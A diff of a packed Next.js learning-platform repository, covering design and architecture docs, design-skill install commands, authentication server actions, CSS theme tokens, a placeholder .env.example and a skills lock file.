-21: 2. Read `docs/rules/Architecture and Stack.md`.
-22: 3. Read `docs/rules/AI Tells (Forbidden Patterns).md`.
-23: 4. Read `docs/skills/Taste Skill Project.md`.
-24: 5. Read `docs/meta/CONVENTIONS.md`.
-25: 
-26: ---
-27: 
-28: # Quick Reference
-29: 
-30: ## Before Building
-31: 
-32: - Set three dials.
-33: - Pick palette.
-34: - Define hero thesis.
-35: - Read existing patterns.
-36: 
-37: ## While Building
-38: 
-39: - Check anti-slop patterns.
-40: - Apply micro-interaction rules.
-41: - Follow typography rules.
-42: - Use design tokens.
-43: 
-44: ## Before Shipping
-45: 
-46: - Run pre-flight checklist.
-47: - Run audit pipeline.
-48: - Update documentation.
-49: - Verify accessibility.
-`````
-
-## File: docs/flows/Install and Load.md
-`````markdown
- 1: # Install and Load
- 2: 
- 3: How to install and load design skills in the project.
- 4: 
- 5: ---
- 6: 
- 7: # Skill Installation
- 8: 
- 9: ## Taste Skill
-10: 
-11: ```bash
-12: npx skills add https://github.com/Leonxlnx/taste-skill --skill "design-taste-frontend"
-13: ```
-14: 
-15: ## Impeccable
-16: 
-17: ```bash
-18: npx impeccable install
-19: ```
-20: 
-21: Then in your AI coding tool:
-22: 
-23: ```
-24: /impeccable init
-25: ```
-26: 
-27: ## Vercel Web Design Guidelines
-28: 
-29: ```bash
-30: npx skills add vercel-labs/agent-skills --skill web-design-guidelines
-31: ```
-32: 
-33: ## UI/UX Pro Max
-34: 
-35: ```bash
-36: npm install -g ui-ux-pro-max-cli
-37: uipro init --ai cursor
-38: ```
-39: 
-40: ---
-41: 
-42: # Loading Skills
-43: 
-44: Skills are loaded in this order (tool-agnostic):
-45: 
-46: 1. **Project-level instructions** — read `AGENTS.md` at the repository root.
-47:    - If your tool does not auto-detect `AGENTS.md`, point it to the file explicitly or to a tool-specific mirror (e.g. `CLAUDE.md`, `.cursorrules`, `.github/copilot-instructions.md`). These mirrors should be kept identical to `AGENTS.md`.
-48:    - For MCP-based agents, use the filesystem MCP tool to read `AGENTS.md`.
-49: 2. `docs/rules/` (architecture and design rules).
-50: 3. `docs/skills/` (design skill references).
-51: 4. `docs/flows/` (workflows).
-52: 5. `docs/audits/` (quality checks).
-53: 
-54: ---
-55: 
-56: # Skill Conflict Resolution
-57: 
-58: When skills conflict:
-59: 
-60: 1. Project rules in `docs/rules/` take precedence.
-61: 2. Vercel guidelines for accessibility and performance.
-62: 3. Taste Skill for aesthetic direction.
-63: 4. Impeccable for anti-pattern detection.
-64: 5. MIFB for micro-interactions.
-65: 
-66: ---
-67: 
-68: # Verification
-69: 
-70: After installing skills:
-71: 
-72: 1. Run the audit pipeline.
-73: 2. Verify no new conflicts.
-74: 3. Update documentation if rules change.
-`````
-
-## File: docs/rules/Architecture and Stack.md
-`````markdown
- 1: # Architecture and Stack
- 2: 
- 3: ## Layers
- 4: 
- 5: ```
- 6: UI (Server Components) → Actions/Routes → Services → Repositories → Database (Prisma + Neon)
- 7: ```
- 8: 
- 9: ## Responsibilities
-10: 
-11: | Layer              | Does                                                         | Must NOT                           |
-12: | ------------------ | ------------------------------------------------------------ | ---------------------------------- |
-13: | **UI**             | Render, user interaction, state display                      | Business logic, direct DB access   |
-14: | **Actions/Routes** | Request handling, auth, Zod validation, call services        | Business logic, direct repo access |
-15: | **Services**       | Business rules, workflows, multi-repo coordination           | UI dependency, HTTP details        |
-16: | **Repositories**   | DB queries, CRUD, persistence. Only layer that calls Prisma. | Business logic                     |
-17: | **Database**       | Prisma models, migrations, PostgreSQL on Neon                | App logic                          |
-18: 
-19: ## Stack Integration
-20: 
-21: - **Next.js 16:** Server Components by default. Client only for state/browser APIs/events. Server Actions for mutations, Route Handlers for APIs, Metadata API for SEO.
-22: - **Prisma + Neon:** serverless PG via `@prisma/adapter-neon`, WebSocket via `ws`, singleton client in `lib/db.ts`. Never instantiate Prisma in components.
-23: - **Zod:** validate all external input. Type inference from schemas. Env validation via `@t3-oss/env-nextjs`.
-24: - **Tailwind v4:** design tokens as CSS custom properties in `globals.css`, oklch color space, dark mode via `.dark` class, `cn()` via `clsx` + `tailwind-merge`.
-25: 
-26: ## Rules
-27: 
-28: - Business logic never in UI. DB access never in UI.
-29: - Validate every external input with Zod.
-30: - No `any`. Prefer inferred types.
-31: - Server Components by default. Thin routes; delegate to services.
-32: - Never modify production DBs manually. Use Prisma migrations.
-33: - Never expose secrets, password hashes, or internal identifiers.
-34: 
-35: ## Data Flow
-36: 
-37: Request → Zod validation → Action/Route → Service → Repository → Prisma → PostgreSQL → back up the stack to Response.
 `````
 
 ## File: docs/AI Instructions.md
@@ -27165,170 +26591,6 @@ tsconfig.json
 85: ## Documentation
 86: 
 87: Architecture changes require doc updates. Docs must reflect current reality.
-`````
-
-## File: docs/Components.md
-`````markdown
- 1: # Components
- 2: 
- 3: ## Folder Layout
- 4: 
- 5: ```
- 6: components/
- 7:   ui/        # shadcn/ui primitives (Button, Input, Card, Dialog, ...)
- 8:   layout/    # Page structure (Header, Sidebar, Footer, Shell)
- 9:   shared/    # Composed reusable components (SearchBar, UserMenu, EmptyState)
-10: features/
-11:   <feature>/ # Feature components co-located with feature
-12: ```
-13: 
-14: ## Composition
-15: 
-16: ```
-17: Page → Layout → Feature → Shared → UI
-18: ```
-19: 
-20: ## Principles
-21: 
-22: - Single responsibility, reusable, props-driven, no hidden side effects.
-23: - UI primitives: generic, no business logic.
-24: - Feature components live next to their feature.
-25: 
-26: ## Accessibility (required on all interactive components)
-27: 
-28: Keyboard navigation · visible focus states · screen-reader labels · semantic HTML.
-29: 
-30: ## Styling
-31: 
-32: Tailwind utilities + design tokens from `globals.css`. No custom CSS unless necessary. No inline styles.
-33: 
-34: ## Creation Checklist
-35: 
-36: - [ ] Reuses an existing component if possible
-37: - [ ] Generic and reusable
-38: - [ ] Lives in the right folder (ui / shared / layout / feature)
-39: - [ ] Accessible, responsive, properly typed
-40: - [ ] Follows anti-slop design rules (see `docs/Design Rules.md`)
-41: - [ ] Uses design tokens, not raw colors
-42: - [ ] Intentional spacing, not uniform defaults
-43: - [ ] Shadows over borders for depth
-44: - [ ] Press states and ≥ 40×40 hit areas on interactive elements
-`````
-
-## File: docs/Design Rules.md
-`````markdown
- 1: # Design Rules
- 2: 
- 3: Frontend quality rules that prevent generic AI-generated output. Read before building any UI.
- 4: 
- 5: ## The Three Dials (set before layout)
- 6: 
- 7: | Dial             | Default | Purpose                                             |
- 8: | ---------------- | ------- | --------------------------------------------------- |
- 9: | Design Variance  | 8       | How much layout breaks from generic grids           |
-10: | Motion Intensity | 6       | Animation/transition presence                       |
-11: | Visual Density   | 4       | Information per viewport (raise for data-heavy UIs) |
-12: 
-13: Defaults 8/6/4 work for most landing pages. Commit to a direction before touching layout.
-14: 
-15: ## Color
-16: 
-17: - One accent color, one radius scale, one theme per page.
-18: - Never purple-to-blue gradients by default.
-19: - Use design tokens from `globals.css`. No inventing new color variables.
-20: 
-21: ## Typography
-22: 
-23: - Body: `max-w-[65ch]`, `text-wrap: pretty`.
-24: - Headlines: `text-wrap: balance`.
-25: - Antialiasing on. Tabular nums for numeric data.
-26: - No em-dash (U+2014) or en-dash (U+2013) in visible text. Use hyphens.
-27: - More whitespace than feels necessary; add density deliberately.
-28: - Prefer shadows/contrast over borders for separation.
-29: 
-30: ## Hero
-31: 
-32: - Headline ≤ 2 lines, subtext ≤ 20 words, CTA above the fold, top padding ≤ `pt-24`, max 4 text elements.
-33: 
-34: ## Navigation
-35: 
-36: - Single line at desktop. Height cap 80px (default 64-72). No hamburger on desktop.
-37: 
-38: ## Layout
-39: 
-40: - 8-section page → use ≥ 4 different layout families.
-41: - Bento grids: exactly N cells for N items.
-42: - Never cards-inside-cards.
-43: - Break the grid at least once. Uniform spacing everywhere looks generated.
-44: 
-45: ## Micro-Interactions
-46: 
-47: - **Radius:** outer = inner + padding (concentric).
-48: - **Press:** `scale(0.96)`. Never below 0.95.
-49: - **Shadows:** compose from 3 layers (ambient, key, rim). Prefer over borders.
-50: - **Hit areas:** minimum 40×40px (extend with pseudo-element if needed).
-51: - **Animation:** icon `scale 0.25→1, opacity 0→1, blur 4px→0`; stagger ~100ms; enter ~800ms, exit subtler; spring `duration 0.3, bounce 0`.
-52: - Always honor `prefers-reduced-motion`.
-53: - **Image outlines:** `1px` at `10%` opacity (black light / white dark).
-54: 
-55: ## Component Checklist
-56: 
-57: - [ ] No generic AI layout (cards-in-cards, uniform grids, centered everything)
-58: - [ ] One accent color, no random gradients
-59: - [ ] Typography uses `balance`/`pretty`
-60: - [ ] Press states visible on interactive elements
-61: - [ ] Shadows are multi-layered
-62: - [ ] Hit areas ≥ 40×40px
-63: - [ ] Animations respect `prefers-reduced-motion`
-64: - [ ] Spacing deliberate, not default
-65: - [ ] Grid broken at least once
-66: - [ ] No em-dashes or en-dashes in visible text
-67: 
-68: ## Anti-Patterns to Flag
-69: 
-70: Inter for everything without justification · purple-to-blue gradient backgrounds · cards-in-cards · uniform spacing · perfectly centered hero with no asymmetric element · no animation on any interactive element · borders instead of shadows · default Tailwind palette used raw · leftover "Welcome to Next.js" boilerplate.
-71: 
-72: ## Sources
-73: 
-74: Taste Skill · make-interfaces-feel-better · Impeccable · Anthropic frontend-design · ui-ux-pro-max · Vercel web-design-guidelines · Refactoring UI · Butterick's Practical Typography.
-`````
-
-## File: docs/Project Context.md
-`````markdown
- 1: # Project Context
- 2: 
- 3: ## Vision
- 4: 
- 5: Modern, scalable, production-ready web application. Clean architecture. Long-term quality over rapid feature development.
- 6: 
- 7: ## Goals
- 8: 
- 9: Solid foundation · business logic independent from UI · maximize reuse · great DX · AI-friendly codebase · low tech debt.
-10: 
-11: ## Priorities
-12: 
-13: 1. Maintainability
-14: 2. Performance
-15: 3. Scalability
-16: 4. Developer Experience
-17: 5. Accessibility
-18: 6. Security
-19: 
-20: ## Constraints
-21: 
-22: TypeScript strict · Server Components by default · minimal client JS · SEO-friendly · accessible · reusable components · clean architecture.
-23: 
-24: ## Non-Goals
-25: 
-26: Over-engineering · premature optimization · unnecessary deps · large client bundles · duplicated business logic.
-27: 
-28: ## Success Criteria
-29: 
-30: Easy to extend, test, document, AI-understand, and onboard new developers.
-31: 
-32: ## Documentation Rules
-33: 
-34: Every significant change updates the docs. ADRs before implementation when possible. Docs always reflect current state.
 `````
 
 ## File: prisma/schema.prisma
@@ -27638,140 +26900,137 @@ tsconfig.json
  28:     };
  29:   }
  30:   try {
- 31:     const result = await authService.signIn(
- 32:       parsed.data.email,
- 33:       parsed.data.password,
- 34:     );
- 35:     return { success: true, data: result as unknown as void };
- 36:   } catch (error) {
- 37:     if (error instanceof Error) {
- 38:       return { success: false, error: error.message };
- 39:     }
- 40:     return { success: false, error: "Sign in failed" };
- 41:   }
- 42: }
- 43: export async function signUpAction(
- 44:   input: SignUpInput,
- 45: ): Promise<ActionResponse> {
- 46:   const parsed = signUpSchema.safeParse(input);
- 47:   if (!parsed.success) {
- 48:     return {
- 49:       success: false,
- 50:       error: parsed.error.issues[0]?.message ?? "Invalid input",
- 51:     };
- 52:   }
- 53:   try {
- 54:     const result = await authService.signUp(
- 55:       parsed.data.email,
- 56:       parsed.data.password,
- 57:       parsed.data.name,
- 58:       parsed.data.role,
- 59:     );
- 60:     return { success: true, data: result as unknown as void };
- 61:   } catch (error) {
- 62:     if (error instanceof Error) {
- 63:       return { success: false, error: error.message };
- 64:     }
- 65:     return { success: false, error: "Sign up failed" };
- 66:   }
- 67: }
- 68: export async function signOutAction(): Promise<ActionResponse> {
- 69:   try {
- 70:     await authService.signOut();
- 71:     return { success: true };
- 72:   } catch (error) {
- 73:     if (error instanceof Error) {
- 74:       return { success: false, error: error.message };
- 75:     }
- 76:     return { success: false, error: "Sign out failed" };
- 77:   }
- 78: }
- 79: export async function getSessionAction() {
- 80:   try {
- 81:     const session = await authService.getCurrentSession();
- 82:     return { success: true, data: session };
- 83:   } catch (error) {
- 84:     if (error instanceof AuthenticationError) {
- 85:       return { success: false, error: "Not authenticated" };
- 86:     }
- 87:     return { success: false, error: "Failed to get session" };
- 88:   }
- 89: }
- 90: export async function getUserRolesAction() {
- 91:   try {
- 92:     const session = await authService.getCurrentSession();
- 93:     const roles = await authorizationService.getUserRoles(session.user.id);
- 94:     return { success: true, data: roles };
- 95:   } catch (error) {
- 96:     if (error instanceof AuthenticationError) {
- 97:       return { success: false, error: "Not authenticated" };
- 98:     }
- 99:     return { success: false, error: "Failed to get roles" };
-100:   }
-101: }
-102: export async function getUserPermissionsAction() {
-103:   try {
-104:     const session = await authService.getCurrentSession();
-105:     const permissions = await authorizationService.getUserPermissions(
-106:       session.user.id,
-107:     );
-108:     return { success: true, data: permissions };
-109:   } catch (error) {
-110:     if (error instanceof AuthenticationError) {
-111:       return { success: false, error: "Not authenticated" };
-112:     }
-113:     return { success: false, error: "Failed to get permissions" };
-114:   }
-115: }
-116: export async function revokeSessionAction(
-117:   sessionId: string,
-118: ): Promise<ActionResponse> {
-119:   if (!sessionId || typeof sessionId !== "string") {
-120:     return { success: false, error: "Invalid session ID" };
-121:   }
-122:   try {
-123:     const session = await authService.getCurrentSession();
-124:     await authService.revokeSession(sessionId, session.user.id);
-125:     return { success: true };
-126:   } catch (error) {
-127:     if (error instanceof AuthenticationError) {
-128:       return { success: false, error: "Not authenticated" };
+ 31:     await authService.signIn(parsed.data.email, parsed.data.password);
+ 32:     return { success: true };
+ 33:   } catch (error) {
+ 34:     if (error instanceof Error) {
+ 35:       return { success: false, error: error.message };
+ 36:     }
+ 37:     return { success: false, error: "Sign in failed" };
+ 38:   }
+ 39: }
+ 40: export async function signUpAction(
+ 41:   input: SignUpInput,
+ 42: ): Promise<ActionResponse> {
+ 43:   const parsed = signUpSchema.safeParse(input);
+ 44:   if (!parsed.success) {
+ 45:     return {
+ 46:       success: false,
+ 47:       error: parsed.error.issues[0]?.message ?? "Invalid input",
+ 48:     };
+ 49:   }
+ 50:   try {
+ 51:     await authService.signUp(
+ 52:       parsed.data.email,
+ 53:       parsed.data.password,
+ 54:       parsed.data.name,
+ 55:       parsed.data.role,
+ 56:     );
+ 57:     return { success: true };
+ 58:   } catch (error) {
+ 59:     if (error instanceof Error) {
+ 60:       return { success: false, error: error.message };
+ 61:     }
+ 62:     return { success: false, error: "Sign up failed" };
+ 63:   }
+ 64: }
+ 65: export async function signOutAction(): Promise<ActionResponse> {
+ 66:   try {
+ 67:     await authService.signOut();
+ 68:     return { success: true };
+ 69:   } catch (error) {
+ 70:     if (error instanceof Error) {
+ 71:       return { success: false, error: error.message };
+ 72:     }
+ 73:     return { success: false, error: "Sign out failed" };
+ 74:   }
+ 75: }
+ 76: export async function getSessionAction() {
+ 77:   try {
+ 78:     const session = await authService.getCurrentSession();
+ 79:     return { success: true, data: session };
+ 80:   } catch (error) {
+ 81:     if (error instanceof AuthenticationError) {
+ 82:       return { success: false, error: "Not authenticated" };
+ 83:     }
+ 84:     return { success: false, error: "Failed to get session" };
+ 85:   }
+ 86: }
+ 87: export async function getUserRolesAction() {
+ 88:   try {
+ 89:     const session = await authService.getCurrentSession();
+ 90:     const roles = await authorizationService.getUserRoles(session.user.id);
+ 91:     return { success: true, data: roles };
+ 92:   } catch (error) {
+ 93:     if (error instanceof AuthenticationError) {
+ 94:       return { success: false, error: "Not authenticated" };
+ 95:     }
+ 96:     return { success: false, error: "Failed to get roles" };
+ 97:   }
+ 98: }
+ 99: export async function getUserPermissionsAction() {
+100:   try {
+101:     const session = await authService.getCurrentSession();
+102:     const permissions = await authorizationService.getUserPermissions(
+103:       session.user.id,
+104:     );
+105:     return { success: true, data: permissions };
+106:   } catch (error) {
+107:     if (error instanceof AuthenticationError) {
+108:       return { success: false, error: "Not authenticated" };
+109:     }
+110:     return { success: false, error: "Failed to get permissions" };
+111:   }
+112: }
+113: export async function revokeSessionAction(
+114:   sessionId: string,
+115: ): Promise<ActionResponse> {
+116:   if (!sessionId || typeof sessionId !== "string") {
+117:     return { success: false, error: "Invalid session ID" };
+118:   }
+119:   try {
+120:     const session = await authService.getCurrentSession();
+121:     await authService.revokeSession(sessionId, session.user.id);
+122:     return { success: true };
+123:   } catch (error) {
+124:     if (error instanceof AuthenticationError) {
+125:       return { success: false, error: "Not authenticated" };
+126:     }
+127:     if (error instanceof AuthorizationError) {
+128:       return { success: false, error: error.message };
 129:     }
-130:     if (error instanceof AuthorizationError) {
-131:       return { success: false, error: error.message };
+130:     if (error instanceof NotFoundError) {
+131:       return { success: false, error: "Session not found" };
 132:     }
-133:     if (error instanceof NotFoundError) {
-134:       return { success: false, error: "Session not found" };
-135:     }
-136:     return { success: false, error: "Failed to revoke session" };
-137:   }
-138: }
-139: export async function revokeAllSessionsAction(): Promise<ActionResponse> {
-140:   try {
-141:     const session = await authService.getCurrentSession();
-142:     await authService.revokeAllSessions(session.user.id);
-143:     return { success: true };
-144:   } catch (error) {
-145:     if (error instanceof AuthenticationError) {
-146:       return { success: false, error: "Not authenticated" };
-147:     }
-148:     return { success: false, error: "Failed to revoke sessions" };
-149:   }
-150: }
-151: export async function assignInitialRoleAction(
-152:   role: "student" | "instructor",
-153: ): Promise<ActionResponse> {
-154:   try {
-155:     const session = await authService.getCurrentSession();
-156:     await authorizationService.assignInitialUserRole(session.user.id, role);
-157:     return { success: true };
-158:   } catch (error) {
-159:     if (error instanceof Error) {
-160:       return { success: false, error: error.message };
-161:     }
-162:     return { success: false, error: "Failed to assign initial role" };
-163:   }
-164: }
+133:     return { success: false, error: "Failed to revoke session" };
+134:   }
+135: }
+136: export async function revokeAllSessionsAction(): Promise<ActionResponse> {
+137:   try {
+138:     const session = await authService.getCurrentSession();
+139:     await authService.revokeAllSessions(session.user.id);
+140:     return { success: true };
+141:   } catch (error) {
+142:     if (error instanceof AuthenticationError) {
+143:       return { success: false, error: "Not authenticated" };
+144:     }
+145:     return { success: false, error: "Failed to revoke sessions" };
+146:   }
+147: }
+148: export async function assignInitialRoleAction(
+149:   role: "student" | "instructor",
+150: ): Promise<ActionResponse> {
+151:   try {
+152:     const session = await authService.getCurrentSession();
+153:     await authorizationService.assignInitialUserRole(session.user.id, role);
+154:     return { success: true };
+155:   } catch (error) {
+156:     if (error instanceof Error) {
+157:       return { success: false, error: error.message };
+158:     }
+159:     return { success: false, error: "Failed to assign initial role" };
+160:   }
+161: }
 `````
 
 ## File: src/app/globals.css
@@ -27823,38 +27082,38 @@ tsconfig.json
  45:   --radius-4xl: calc(var(--radius) * 2.6);
  46: }
  47: :root {
- 48:   --background: oklch(1 0 0);
- 49:   --foreground: oklch(0.145 0 0);
- 50:   --card: oklch(1 0 0);
- 51:   --card-foreground: oklch(0.145 0 0);
- 52:   --popover: oklch(1 0 0);
- 53:   --popover-foreground: oklch(0.145 0 0);
- 54:   --primary: oklch(0.205 0 0);
- 55:   --primary-foreground: oklch(0.985 0 0);
- 56:   --secondary: oklch(0.97 0 0);
- 57:   --secondary-foreground: oklch(0.205 0 0);
- 58:   --muted: oklch(0.97 0 0);
- 59:   --muted-foreground: oklch(0.556 0 0);
- 60:   --accent: oklch(0.97 0 0);
- 61:   --accent-foreground: oklch(0.205 0 0);
- 62:   --destructive: oklch(0.577 0.245 27.325);
- 63:   --border: oklch(0.922 0 0);
- 64:   --input: oklch(0.922 0 0);
- 65:   --ring: oklch(0.708 0 0);
- 66:   --chart-1: oklch(0.87 0 0);
- 67:   --chart-2: oklch(0.556 0 0);
- 68:   --chart-3: oklch(0.439 0 0);
- 69:   --chart-4: oklch(0.371 0 0);
- 70:   --chart-5: oklch(0.269 0 0);
- 71:   --radius: 0.625rem;
- 72:   --sidebar: oklch(0.985 0 0);
- 73:   --sidebar-foreground: oklch(0.145 0 0);
- 74:   --sidebar-primary: oklch(0.205 0 0);
- 75:   --sidebar-primary-foreground: oklch(0.985 0 0);
- 76:   --sidebar-accent: oklch(0.97 0 0);
- 77:   --sidebar-accent-foreground: oklch(0.205 0 0);
- 78:   --sidebar-border: oklch(0.922 0 0);
- 79:   --sidebar-ring: oklch(0.708 0 0);
+ 48:   --card: oklch(1 0 0);
+ 49:   --card-foreground: oklch(0.145 0 0);
+ 50:   --popover: oklch(1 0 0);
+ 51:   --popover-foreground: oklch(0.145 0 0);
+ 52:   --primary: oklch(0.205 0 0);
+ 53:   --primary-foreground: oklch(0.985 0 0);
+ 54:   --secondary: oklch(0.97 0 0);
+ 55:   --secondary-foreground: oklch(0.205 0 0);
+ 56:   --muted: oklch(0.97 0 0);
+ 57:   --muted-foreground: oklch(0.556 0 0);
+ 58:   --accent: oklch(0.97 0 0);
+ 59:   --accent-foreground: oklch(0.205 0 0);
+ 60:   --destructive: oklch(0.577 0.245 27.325);
+ 61:   --border: oklch(0.922 0 0);
+ 62:   --input: oklch(0.922 0 0);
+ 63:   --ring: oklch(0.708 0 0);
+ 64:   --chart-1: oklch(0.87 0 0);
+ 65:   --chart-2: oklch(0.556 0 0);
+ 66:   --chart-3: oklch(0.439 0 0);
+ 67:   --chart-4: oklch(0.371 0 0);
+ 68:   --chart-5: oklch(0.269 0 0);
+ 69:   --radius: 0.625rem;
+ 70:   --sidebar: oklch(0.985 0 0);
+ 71:   --sidebar-foreground: oklch(0.145 0 0);
+ 72:   --sidebar-primary: oklch(0.205 0 0);
+ 73:   --sidebar-primary-foreground: oklch(0.985 0 0);
+ 74:   --sidebar-accent: oklch(0.97 0 0);
+ 75:   --sidebar-accent-foreground: oklch(0.205 0 0);
+ 76:   --sidebar-border: oklch(0.922 0 0);
+ 77:   --sidebar-ring: oklch(0.708 0 0);
+ 78:   --background: oklch(1 0 0);
+ 79:   --foreground: oklch(0.145 0 0);
  80: }
  81: .dark {
  82:   --background: oklch(0.145 0 0);
@@ -27930,9 +27189,9 @@ tsconfig.json
 `````typescript
  1: import { Button as ButtonPrimitive } from "@base-ui/react/button";
  2: import { cva, type VariantProps } from "class-variance-authority";
- 3: import { cn } from "@/lib/utils";
+ 3: import { cn } from "cn";
  4: const buttonVariants = cva(
- 5:   "group/button inline-flex shrink-0 cursor-pointer items-center justify-center rounded-lg border border-transparent bg-clip-padding text-sm font-medium whitespace-nowrap transition-all outline-none select-none focus-visible:border-ring focus-visible:ring-3 focus-visible:ring-ring/50 active:not-aria-[haspopup]:translate-y-px disabled:pointer-events-none disabled:opacity-50 aria-invalid:border-destructive aria-invalid:ring-3 aria-invalid:ring-destructive/20 dark:aria-invalid:border-destructive/50 dark:aria-invalid:ring-destructive/40 [&_svg]:pointer-events-none [&_svg]:shrink-0 [&_svg:not([class*='size-'])]:size-4",
+ 5:   "group/button inline-flex shrink-0 items-center justify-center rounded-lg border border-transparent bg-clip-padding text-sm font-medium whitespace-nowrap transition-all outline-none select-none focus-visible:border-ring focus-visible:ring-3 focus-visible:ring-ring/50 active:not-aria-[haspopup]:translate-y-px disabled:pointer-events-none disabled:opacity-50 aria-invalid:border-destructive aria-invalid:ring-3 aria-invalid:ring-destructive/20 dark:aria-invalid:border-destructive/50 dark:aria-invalid:ring-destructive/40 [&_svg]:pointer-events-none [&_svg]:shrink-0 [&_svg:not([class*='size-'])]:size-4",
  6:   {
  7:     variants: {
  8:       variant: {
@@ -28101,97 +27360,6 @@ tsconfig.json
 15:   );
 16: }
 17: export { Input };
-`````
-
-## File: src/components/ui/separator.tsx
-`````typescript
- 1: "use client";
- 2: import { Separator as SeparatorPrimitive } from "@base-ui/react/separator";
- 3: import { cn } from "@/lib/utils";
- 4: function Separator({
- 5:   className,
- 6:   orientation = "horizontal",
- 7:   ...props
- 8: }: SeparatorPrimitive.Props) {
- 9:   return (
-10:     <SeparatorPrimitive
-11:       data-slot="separator"
-12:       orientation={orientation}
-13:       className={cn(
-14:         "bg-border shrink-0 data-horizontal:h-px data-horizontal:w-full data-vertical:w-px data-vertical:self-stretch",
-15:         className,
-16:       )}
-17:       {...props}
-18:     />
-19:   );
-20: }
-21: export { Separator };
-`````
-
-## File: src/lib/env.ts
-`````typescript
- 1: import { createEnv } from "@t3-oss/env-nextjs";
- 2: import * as z from "zod";
- 3: export const env = createEnv({
- 4:   server: {
- 5:     DATABASE_URL: z.url(),
- 6:     DIRECT_URL: z.url().optional(),
- 7:     BETTER_AUTH_SECRET: z.string().min(32),
- 8:     BETTER_AUTH_URL: z.url(),
- 9:     SENTRY_DSN: z.string().optional(),
-10:     SENTRY_ORG: z.string().optional(),
-11:     SENTRY_PROJECT: z.string().optional(),
-12:     SENTRY_AUTH_TOKEN: z.string().optional(),
-13:   },
-14:   client: {
-15:     NEXT_PUBLIC_SENTRY_DSN: z.string().optional(),
-16:   },
-17:   runtimeEnv: {
-18:     DATABASE_URL: process.env.DATABASE_URL,
-19:     DIRECT_URL: process.env.DIRECT_URL,
-20:     BETTER_AUTH_SECRET: process.env.BETTER_AUTH_SECRET,
-21:     BETTER_AUTH_URL: process.env.BETTER_AUTH_URL,
-22:     SENTRY_DSN: process.env.SENTRY_DSN,
-23:     SENTRY_ORG: process.env.SENTRY_ORG,
-24:     SENTRY_PROJECT: process.env.SENTRY_PROJECT,
-25:     SENTRY_AUTH_TOKEN: process.env.SENTRY_AUTH_TOKEN,
-26:     NEXT_PUBLIC_SENTRY_DSN: process.env.NEXT_PUBLIC_SENTRY_DSN,
-27:   },
-28: });
-`````
-
-## File: src/repositories/session.ts
-`````typescript
- 1: import { prisma } from "@/lib/db";
- 2: export async function findSessionByToken(token: string) {
- 3:   return prisma.session.findUnique({
- 4:     where: { token },
- 5:     include: { user: true },
- 6:   });
- 7: }
- 8: export async function findSessionById(id: string) {
- 9:   return prisma.session.findUnique({
-10:     where: { id },
-11:     include: { user: true },
-12:   });
-13: }
-14: export async function findSessionsByUserId(userId: string) {
-15:   return prisma.session.findMany({
-16:     where: { userId },
-17:     orderBy: { createdAt: "desc" },
-18:   });
-19: }
-20: export async function deleteSession(id: string) {
-21:   return prisma.session.delete({ where: { id } });
-22: }
-23: export async function deleteSessionsByUserId(userId: string) {
-24:   return prisma.session.deleteMany({ where: { userId } });
-25: }
-26: export async function deleteExpiredSessions() {
-27:   return prisma.session.deleteMany({
-28:     where: { expiresAt: { lt: new Date() } },
-29:   });
-30: }
 `````
 
 ## File: src/services/__tests__/auth.test.ts
@@ -28374,6 +27542,26 @@ tsconfig.json
 176: });
 `````
 
+## File: .env.example
+`````
+ 1: # Database (Neon PostgreSQL)
+ 2: DATABASE_URL="postgresql://user:password@host/database?sslmode=require"
+ 3: DIRECT_URL="postgresql://user:password@host/database?sslmode=require"
+ 4: 
+ 5: # Better Auth
+ 6: BETTER_AUTH_SECRET="<generate with: openssl rand -base64 32>"
+ 7: BETTER_AUTH_URL="http://localhost:3000"
+ 8: 
+ 9: # Sentry (Error Monitoring & Performance Tracking)
+10: # Client & Server DSN: https://<key>@<org>.ingest.sentry.io/<project>
+11: NEXT_PUBLIC_SENTRY_DSN=""
+12: SENTRY_DSN=""
+13: # Required for uploading source maps during production build / CI
+14: SENTRY_ORG=""
+15: SENTRY_PROJECT=""
+16: SENTRY_AUTH_TOKEN=""
+`````
+
 ## File: AGENTS.md
 `````markdown
  1: # Antigravity AI Guide — Next.js LMS
@@ -28440,20 +27628,6 @@ tsconfig.json
 62: **STOP immediately** and report using the escalation protocol in `.agents/rules/operating-system.md`.
 `````
 
-## File: prisma.config.ts
-`````typescript
- 1: import "dotenv/config";
- 2: import { defineConfig } from "prisma/config";
- 3: export default defineConfig({
- 4:   datasource: {
- 5:     url:
- 6:       process.env.DIRECT_URL ||
- 7:       process.env.DATABASE_URL ||
- 8:       "postgresql://placeholder:placeholder@localhost:5432/placeholder",
- 9:   },
-10: });
-`````
-
 ## File: skills-lock.json
 `````json
  1: {
@@ -28470,47 +27644,202 @@ tsconfig.json
 12:       "sourceType": "github",
 13:       "skillPath": "skills/next-dev-loop/SKILL.md",
 14:       "computedHash": "d2a697a0a0429cad0bb7264644115457f588d4ed1007eeb0bb7f965b1185fa6e"
-15:     }
-16:   }
-17: }
+15:     },
+16:     "search-registry-items": {
+17:       "source": "alibey-10/shoogle",
+18:       "sourceType": "github",
+19:       "skillPath": "skills/search-registry-items/SKILL.md",
+20:       "computedHash": "109b782b2697d70a2bc31728bcde618eca8d88d6df227952e4bbcf9c39eca10e"
+21:     }
+22:   }
+23: }
 `````
 
-## File: tsconfig.json
-`````json
- 1: {
- 2:   "compilerOptions": {
- 3:     "target": "ES2017",
- 4:     "lib": ["dom", "dom.iterable", "esnext"],
- 5:     "allowJs": true,
- 6:     "skipLibCheck": true,
- 7:     "strict": true,
- 8:     "noEmit": true,
- 9:     "esModuleInterop": true,
-10:     "module": "esnext",
-11:     "moduleResolution": "bundler",
-12:     "resolveJsonModule": true,
-13:     "isolatedModules": true,
-14:     "jsx": "react-jsx",
-15:     "incremental": true,
-16:     "plugins": [
-17:       {
-18:         "name": "next"
-19:       }
-20:     ],
-21:     "paths": {
-22:       "@/*": ["./src/*"]
-23:     }
-24:   },
-25:   "include": [
-26:     "next-env.d.ts",
-27:     "**/*.ts",
-28:     "**/*.tsx",
-29:     ".next/types/**/*.ts",
-30:     ".next/dev/types/**/*.ts",
-31:     "**/*.mts"
-32:   ],
-33:   "exclude": ["node_modules"]
-34: }
+## File: docs/API/Database.md
+`````markdown
+  1: # Database
+  2: 
+  3: PostgreSQL on Neon. Prisma ORM. Repositories are the only layer that talks to Prisma.
+  4: 
+  5: ## Principles
+  6: 
+  7: Simple, normalized, scalable, easy to maintain. **No business logic in the database.**
+  8: 
+  9: ## Access Flow
+ 10: 
+ 11: ```
+ 12: UI → Actions → Services → Repositories → Prisma → PostgreSQL
+ 13: ```
+ 14: 
+ 15: ## Schema
+ 16: 
+ 17: ### Authentication Models (Better Auth)
+ 18: 
+ 19: #### User
+ 20: 
+ 21: | Field         | Type     | Notes         |
